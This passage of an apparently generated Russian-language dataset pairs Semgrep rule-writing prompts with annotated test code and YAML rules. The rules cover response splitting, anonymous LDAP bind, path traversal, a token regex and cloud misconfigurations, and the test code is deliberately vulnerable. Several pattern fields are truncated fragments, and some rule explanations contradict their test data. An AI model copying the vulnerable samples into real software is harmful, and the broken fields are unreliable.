    "output": "rules:\n- id: correctness-regioninfo-interop\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $WRITER.Write($RI);\n    - pattern: |\n        $WRITER.WriteAsync($RI);\n    - pattern: |\n        $WRITER.WriteLine($RI);\n    - pattern: |\n        $WRITER.WriteLineAsync($RI);\n  - pattern-inside: |\n      RegionInfo $RI = new RegionInfo($REGION);\n      ...\n      using($PIPESTREAM $P = ...){\n        ...\n      }\n  - metavariable-regex:\n      metavariable: $REGION\n      regex: ^\"\\w{2}\"$\n  - metavariable-regex:\n      metavariable: $PIPESTREAM\n      regex: (Anonymous|Named)Pipe(Server|Client)Stream\n  message: >-\n    Potential inter-process write of RegionInfo $RI via $PIPESTREAM $P that was instantiated with a two-character culture code $REGION. \n    Per .NET documentation, if you want to persist a RegionInfo object or communicate it between processes, you should instantiate it by using a full culture name rather than a two-letter ISO region code.\n  languages:\n  - csharp\n  severity: WARNING\n  metadata:\n    references:\n    - https://docs.microsoft.com/en-us/dotnet/api/system.globalization.regioninfo.twoletterisoregionname?view=net-6.0#remarks\n    technology:\n    - .net\n    category: correctness\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных межпроцессных записей объектов RegionInfo, которые были созданы с использованием двухсимвольного кода региона ($REGION), вместо полного имени культуры. Правило использует комбинацию шаблонов для обнаружения записи RegionInfo через поток ($WRITER) и создания RegionInfo с использованием двухбуквенного кода ($REGION). Шаблоны также проверяют тип потока ($PIPESTREAM) и наличие двухсимвольного кода региона с помощью регулярных выражений.\n\n# Ключевые элементы:\n- ID: correctness-regioninfo-interop\n- Язык: csharp \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "correctness-regioninfo-interop",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: http-response-splitting\nОписание уязвимости: Older Java application servers are vulnerable to HTTP response splitting, which may occur if an HTTP request can be injected with CRLF characters. This finding is reported for completeness; it is recommended to ensure your environment is not affected by testing this yourself.\nCWE: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n- Серьезность: INFO\n\nКонтекст кода:\n// File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n\n    @RequestMapping(method = RequestMethod.GET)\n    @PreAuthorize(Permissions.ADMIN)\n    @ResponseBody\n    public void list(HttpServletRequest request, HttpServletResponse response) {\n        // ruleid:http-response-splitting\n        String author = request.getParameter(AUTHOR_PARAMETER);\n        Cookie cookie = new Cookie(\"author\", author);\n        response.addCookie(cookie);\n    }\n\n    @RequestMapping(value = \"/{name}\", method = RequestMethod.POST)\n    @PreAuthorize(Permissions.USER)\n    @ResponseBody\n    public void load(@PathVariable final String name, HttpServletResponse response) throws APIException {\n        // ruleid:http-response-splitting\n        Cookie cookie = new Cookie(\"author\", name);\n        response.addCookie(cookie);\n    }\n\n    private Response safe(String name, Response response) {\n        // ok:http-response-splitting\n        Cookie cookie = new Cookie(\"author\", name);\n        response.addCookie(cookie);\n        return response;\n    }\n\n    @RequestMapping(value = \"/{name}/{book}\", method = RequestMethod.POST)\n    @PreAuthorize(Permissions.USER)\n    @ResponseBody\n    public void loadBook(@PathVariable final String name, @PathVariable final String book, HttpServletResponse response) throws APIException {\n        AuthorObj author = AuthorObj.getAuthor(name, book);\n        // ok:http-response-splitting\n        Cookie cookie = new Cookie(\"sess\", \"1234\");\n        response.addCookie(cookie);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    @RequestMapping(method = RequestMethod.GET)\n    @PreAuthorize(Permissions.ADMIN)\n  \n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    @RequestMapping(value = \"/{name}\", method = RequestMethod.POST)\n    @PreAuthorize(P\n\nБезопасные паттерны:  \n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    private Response safe(String name, Response response) {\n        // ok:http-response\n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    @RequestMapping(value = \"/{name}/{book}\", method = RequestMethod.POST)\n    @PreAuth\n\nЛегенда аннотаций:\n- // ruleid:http-response-splitting: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:http-response-splitting: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: http-response-splitting\n  metadata:\n    cwe:\n    - \"CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\"\n    owasp:\n    - A03:2021 - Injection\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#HTTP_RESPONSE_SPLITTING\n    references:\n    - https://www.owasp.org/index.php/HTTP_Response_Splitting\n    category: security\n    technology:\n    - java\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: >-\n    Older Java application servers are vulnerable to HTTP response splitting, which\n    may occur if an HTTP\n    request can be injected with CRLF characters. This finding is reported for completeness;\n    it is recommended\n    to ensure your environment is not affected by testing this yourself.\n  severity: INFO\n  languages:\n  - java\n  pattern-either:\n  - pattern: |\n      $VAR = $REQ.getParameter(...);\n      ...\n      $COOKIE = new Cookie(..., $VAR, ...);\n      ...\n      $RESP.addCookie($COOKIE, ...);\n  - patterns:\n    - pattern-inside: |\n        $RETTYPE $FUNC(...,@PathVariable $TYPE $VAR, ...) {\n          ...\n        }\n    - pattern: |\n        $COOKIE = new Cookie(..., $VAR, ...);\n        ...\n        $RESP.addCookie($COOKIE, ...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей HTTP response splitting в Java-коде. Оно ищет случаи, когда значение параметра запроса или переменной, полученной от PathVariable, используется непосредственно при создании нового объекта Cookie и последующем вызове addCookie() метода HttpServletResponse. Это может позволить злоумышленнику вставить специальные символы, такие как CRLF, которые могут привести к разделению заголовков HTTP ответов, вызывая уязвимость.\n\n# Ключевые элементы:\n- ID: http-response-splitting\n- Язык: java \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "http-response-splitting",
      "language": "java",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: ldap-bind-without-password\nОписание уязвимости: Detected anonymous LDAP bind. This permits anonymous users to execute LDAP statements. Consider enforcing authentication for LDAP.\nCWE: CWE-287: Improper Authentication\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-287: Improper Authentication\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: ldap-bind-without-password.php\n<?php\n\n$ldapconn = ldap_connect(\"foo.com\");\n\n// ruleid: ldap-bind-without-password\n$ldapbind = ldap_bind($ldapconn);\n\n// ruleid: ldap-bind-without-password\nLDAP_BIND($ldapconn, \"username\");\n\n// ruleid: ldap-bind-without-password\nldap_bind($ldapconn, NULL, NULL);\n\n// ruleid: ldap-bind-without-password\nldap_bind($ldapconn, \"username\", \"\");\n\n$a = \"\";\n$b = \"\";\n// ruleid: ldap-bind-without-password\nldap_bind($ldapconn, $a, $b);\n\n$c = \"username\";\n$d = \"\";\n// ruleid: ldap-bind-without-password\nldap_bind($ldapconn, $c, $d);\n\n$e = \"user\";\n$f = \"pass\";\n// ok: ldap-bind-without-password\nldap_bind($ldapconn, $e, $f);\n\n// ok: ldap-bind-without-password\nldap_bind($ldapconn, \"username\", \"password\");\n\n// ok: ldap-bind-without-password\nldap_bind($ldapconn, $username, $password);  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: ldap-bind-without-password\nldap_bind($ldapconn);\n• // ruleid: ldap-bind-without-password\nLDAP_BIND($ldapconn, \"username\");\n• // ruleid: ldap-bind-without-password\nldap_bind($ldapconn, NULL, NULL);\n\nБезопасные паттерны:  \n• // ok: ldap-bind-without-password\nldap_bind($ldapconn, \"username\", \"password\");\n• // ok: ldap-bind-without-password\nldap_bind($ldapconn, $username, $password);\n\nЛегенда аннотаций:\n- // ruleid:ldap-bind-without-password: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ldap-bind-without-password: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ldap-bind-without-password\n  patterns:\n  - pattern-either:\n    - pattern: ldap_bind($LDAP, $DN, NULL)\n    - pattern: ldap_bind($LDAP, $DN, '')\n    - patterns:\n      - pattern: ldap_bind(...)\n      - pattern-not: ldap_bind($LDAP, $DN, $PASSWORD)\n  message: >-\n    Detected anonymous LDAP bind.\n    This permits anonymous users to execute LDAP statements.\n    Consider enforcing authentication for LDAP.\n  metadata:\n    references:\n    - https://www.php.net/manual/en/function.ldap-bind.php\n    cwe:\n    - 'CWE-287: Improper Authentication'\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A07:2021 - Identification and Authentication Failures\n    category: security\n    technology:\n    - php\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [php]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции ldap_bind() в PHP-коде, где второй и третий аргументы либо отсутствуют, либо пусты. Такие вызовы могут привести к анонимному связыванию с сервером LDAP, что позволяет неавторизованным пользователям выполнять запросы LDAP. Правило использует комбинацию шаблонов и исключений для выявления опасных конструкций.\n\n# Ключевые элементы:\n- ID: ldap-bind-without-password\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ldap-bind-without-password",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: azure-defenderon-keyvaults\nОписание уязвимости: Ensure that Azure Defender is set to On for Key Vault\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-defenderon-keyvaults.tf\n# fail\n# ruleid: azure-defenderon-keyvaults\nresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n    tier          = \"Free\"\n    resource_type = \"KeyVaults\"\n}\n\n# pass\nresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n    tier          = \"Standard\"\n    resource_type = \"KeyVaults\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_security_center_subscription_pricing\" \"example\" {\n    tier          = \"Free\"\n    resource_type = \"KeyVaults\"\n}\n• resource \"azurerm_security_center_subscription_pricing\" \"example\" {\n    tier          = \"Basic\"\n    resource_type = \"KeyVaults\"\n}\n\nБезопасные паттерны:  \n• resource \"azurerm_security_center_subscription_pricing\" \"example\" {\n    tier          = \"Standard\"\n    resource_type = \"KeyVaults\"\n}\n• resource \"azurerm_security_center_subscription_pricing\" \"example\" {\n    tier          = \"Premium\"\n    resource_type = \"KeyVaults\"\n}\n\nЛегенда аннотаций:\n- // ruleid:azure-defenderon-keyvaults: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-defenderon-keyvaults: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-defenderon-keyvaults\n    message: >-\n      Ensure that Azure Defender is set to On for Key Vault\n    patterns:\n      - pattern: resource\n      - pattern-not-inside: |\n          resource \"azurerm_security_center_subscription_pricing\" \"...\" {\n          ...\n          tier = \"Standard\"\n          resource_type = \"KeyVaults\"\n          ...\n          }\n      - pattern-inside: |\n          resource \"azurerm_security_center_subscription_pricing\" \"...\" {\n          ...\n          tier = \"Free\"\n          resource_type = \"KeyVaults\"\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Terraform, связанных с ресурсом 'azurerm_security_center_subscription_pricing'. Правило проверяет, установлен ли параметр 'tier' равным 'Standard' для ресурса типа 'KeyVaults', так как это требуется для включения Azure Defender. Если 'tier' равен 'Free', то это считается опасным примером, поскольку Azure Defender не включен. Безопасный пример — когда 'tier' установлен в 'Standard', что соответствует требуемой конфигурации.\n\n# Ключевые элементы:\n- ID: azure-defenderon-keyvaults\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-defenderon-keyvaults",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-gke-alias-ip-enabled\nОписание уязвимости: Ensure Kubernetes Cluster is created with Alias IP ranges enabled\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-alias-ip-enabled.tf\n# fail\n# ruleid: gcp-gke-alias-ip-enabled\nresource \"google_container_cluster\" \"fail\" {\n  name                     = \"fail-cluster\"\n}\n\n# ok: gcp-gke-alias-ip-enabled\nresource \"google_container_cluster\" \"success\" {\n  name                     = \"success-cluster\"\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block  = \"10.32.0.0/14\"\n    services_ipv4_cidr_block = \"10.0.0.0/20\"\n    use_ip_aliases           = \"false\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail\" { \n  name = \"fail-cluster\"\n}\n• resource \"google_container_cluster\" \"another-fail\" { \n  name = \"another-fail-cluster\"\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block = \"10.32.0.0/14\"\n    services_ipv4_cidr_block = \"10.0.0.0/20\"\n• resource \"google_container_cluster\" \"third-fail\" { \n  name = \"third-fail-cluster\"\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block = \"10.32.0.0/14\"\n    services_ipv4_cidr_block = \"10.0.0.0/20\"\n  }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success\" { \n  name = \"success-cluster\"\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block = \"10.32.0.0/14\"\n    services_ipv4_cidr_block = \"10.0.0.0/20\"\n    use_i\n• resource \"google_container_cluster\" \"second-success\" { \n  name = \"second-success-cluster\"\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block = \"192.168.0.0/16\"\n    services_ipv4_cidr_block = \"172.16\n• resource \"google_container_cluster\" \"third-success\" { \n  name = \"third-success-cluster\"\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block = \"192.168.0.0/16\"\n    services_ipv4_cidr_block = \"172.16.0\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-alias-ip-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-alias-ip-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-alias-ip-enabled\n  patterns:\n    - pattern: resource\n    - pattern-inside: |\n        resource \"google_container_cluster\" \"...\" {\n        ...\n        }\n    - pattern-not-inside: |\n        resource \"google_container_cluster\" \"...\" {\n        ...\n        ip_allocation_policy {\n          ...\n          use_ip_aliases = \"false\"\n          ...\n        }\n        ...\n        }\n  message: >-\n    Ensure Kubernetes Cluster is created with Alias IP ranges enabled\n  metadata:\n    category: best-practice\n    technology:\n      - terraform\n      - gcp\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Terraform конфигураций Google Kubernetes Engine (GKE), где не включена опция использования псевдонимов IP-адресов (use_ip_aliases). Анализ выполняется путем поиска ресурса google_container_cluster и проверки наличия блока ip_allocation_policy внутри него. Если блок присутствует, но значение use_ip_aliases равно 'false', то это считается опасным примером. Безопасный пример — когда ресурс содержит корректно настроенный блок ip_allocation_policy с установленным значением use_ip_aliases равным 'true'.\n\n# Ключевые элементы:\n- ID: gcp-gke-alias-ip-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-alias-ip-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-spanner-database-encrypted-with-cmk\nОписание уязвимости: Ensure Spanner Database is encrypted with Customer Supplied Encryption Keys (CSEK)\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-spanner-database-encrypted-with-cmk.tf\n# fail\n# ruleid: gcp-spanner-database-encrypted-with-cmk\nresource \"google_spanner_database\" \"fail\" {\n  instance = google_spanner_instance.example.name\n  name     = \"my-database\"\n  ddl = [\n    \"CREATE TABLE t1 (t1 INT64 NOT NULL,) PRIMARY KEY(t1)\",\n    \"CREATE TABLE t2 (t2 INT64 NOT NULL,) PRIMARY KEY(t2)\",\n  ]\n  deletion_protection = false\n}\n\n# ok: gcp-spanner-database-encrypted-with-cmk\nresource \"google_spanner_database\" \"pass\" {\n  instance = google_spanner_instance.example.name\n  name     = \"my-database\"\n  ddl = [\n    \"CREATE TABLE t1 (t1 INT64 NOT NULL,) PRIMARY KEY(t1)\",\n    \"CREATE TABLE t2 (t2 INT64 NOT NULL,) PRIMARY KEY(t2)\",\n  ]\n  deletion_protection = false\n  encryption_config {\n      kms_key_name = google_kms_crypto_key.example.name\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_spanner_database\" \"fail\" { ... }\n• resource \"google_spanner_database\" \"another-fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"google_spanner_database\" \"pass\" { ... encryption_config { kms_key_name = ... } ... }\n• resource \"google_spanner_database\" \"safe-config\" { ... encryption_config { kms_key_name = ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-spanner-database-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-spanner-database-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-spanner-database-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"google_spanner_database\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"google_spanner_database\" $ANYTHING {\n        ...\n        encryption_config {\n          ...\n          kms_key_name = ...\n          ...\n        }\n        ...\n      }\n  message: >-\n    Ensure Spanner Database is encrypted with Customer Supplied Encryption Keys (CSEK)\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - gcp\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Terraform конфигураций Google Cloud Spanner баз данных, которые не используют Customer Supplied Encryption Keys (CSEK). Анализ выполняется путем поиска ресурса google_spanner_database и проверки наличия блока encryption_config с атрибутом kms_key_name внутри него. Если такой блок отсутствует, то конфигурация считается небезопасной. Правило использует шаблон pattern для нахождения ресурсов и отрицательный шаблон pattern-not-inside для исключения случаев, когда ресурс содержит требуемый блок конфигурации.\n\n# Ключевые элементы:\n- ID: gcp-spanner-database-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-spanner-database-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: finnhub-access-token\nОписание уязвимости: A gitleaks finnhub-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: finnhub-access-token.go\n// ruleid: finnhub-access-token\nfinnhub_api_token = \"r5bcoxh2rfhexu4hmyc8  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: finnhub-access-token.go\\n// ruleid: finnhub-access-token\\nfinnhub_api_token = \\\n• ,\n    \n• abc123def456ghijkl7890mnopqrs\\\n\nБезопасные паттерны:  \n• // File: safe-code.go\\n// ruleid: finnhub-access-token\\nfunc getFinnhubToken() string {\\n    return os.Getenv(\\\n• )\\n}\n• // File: secure-config.go\\n// ruleid: finnhub-access-token\\nconfig := loadConfigFromVault(\\\n\nЛегенда аннотаций:\n- // ruleid:finnhub-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:finnhub-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: finnhub-access-token\n  message: A gitleaks finnhub-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:finnhub)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{20})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа finnhub в исходном коде. Оно ищет строку, содержащую слово 'finnhub' в любом регистре, за которым следуют 20 символов в нижнем регистре и цифрах, разделенных пробелами или символами табуляции. Правило применяет модификатор case insensitive ('?i') и игнорирует незначительные символы ('|', '\\'', '\\\n\n# Ключевые элементы:\n- ID: finnhub-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "finnhub-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: path-traversal-open\nОписание уязвимости: Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise it could result in path traversal attacks and therefore sensitive data being leaked. To mitigate, consider using os.path.abspath or os.path.realpath or the pathlib library.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: path-traversal-open.py\nimport re, os\nfrom django.http import HttpResponse\nfrom somewhere import APIView\n\ndef unsafe(request):\n    # ruleid: path-traversal-open\n    filename = request.POST.get('filename')\n    contents = request.POST.get('contents')\n    print(\"something\")\n    f = open(filename, 'r')\n    f.write(contents)\n    f.close()\n\ndef unsafe_inline(request):\n    # ruleid: path-traversal-open\n    f = open(request.GET.get('filename'))\n    f.write(request.POST.get('contents'))\n    f.close()\n\ndef unsafe_dict(request):\n    # ruleid: path-traversal-open\n    f = open(request.POST['filename'])\n    f.write(\"hello\")\n    f.close()\n\ndef unsafe_with(request):\n    # ruleid: path-traversal-open\n    filename = request.POST.get(\"filename\")\n    with open(filename, 'r') as fin:\n        data = fin.read()\n    return HttpResponse(data)\n\ndef safe(request):\n    # ok: path-traversal-open\n    filename = \"/tmp/data.txt\"\n    f = open(filename)\n    f.write(\"hello\")\n    f.close()\n\n# Real-world finding\ndef download_doc(request):\n    # ruleid: path-traversal-open\n    url = request.GET.get(\"url\")\n    format_doc = url.split(\".\")\n    if format_doc[-1] == \"docx\":\n        file_name = str(int(time.time())) + \".docx\"\n    else:\n        file_name = str(int(time.time())) + \".xlsx\"\n\n    def file_iterator(_file, chunk_size=512):\n        while True:\n            c = _file.read(chunk_size)\n            if c:\n                yield c\n            else:\n                break\n\n    _file = open(url, \"rb\")\n    response = StreamingHttpResponse(file_iterator(_file))\n    response[\"Content-Type\"] = \"application/octet-stream\"\n    response[\"Content-Disposition\"] = \"attachment;filename=\\\"{0}\\\"\".format(file_name)\n    return response\n\nclass GenerateUserAPI(APIView):\n    def get(self, request):\n        \"\"\"\n        download users excel\n        \"\"\"\n        # ruleid: path-traversal-open\n        file_id = request.GET.get(\"file_id\")\n        if not file_id:\n            return self.error(\"Invalid Parameter, file_id is requir  # Ограничиваем длину\n\nОпасные паттерны:\n• filename = request.POST.get('filename')\n...\no = open(filename, 'r')\n• f = open(request.GET.get('filename'))\n• f = open(request.POST['filename'])\n\nБезопасные паттерны:  \n• filename = \"/tmp/data.txt\"\no = open(filename)\n• filename = \"data.txt\"\no = open(filename)\n• filename = '/tmp/data.txt'\no = open(filename)\n\nЛегенда аннотаций:\n- // ruleid:path-traversal-open: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:path-traversal-open: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: path-traversal-open\n  message: >-\n    Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise\n    it could result in path traversal attacks and therefore sensitive data being leaked.\n    To mitigate, consider using os.path.abspath or os.path.realpath\n    or the pathlib library.\n  metadata:\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    references:\n    - https://owasp.org/www-community/attacks/Path_Traversal\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n  - pattern-either:\n    - pattern: open(..., request.$W.get(...), ...)\n    - pattern: open(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: open(..., $S % request.$W.get(...), ...)\n    - pattern: open(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W.get(...), 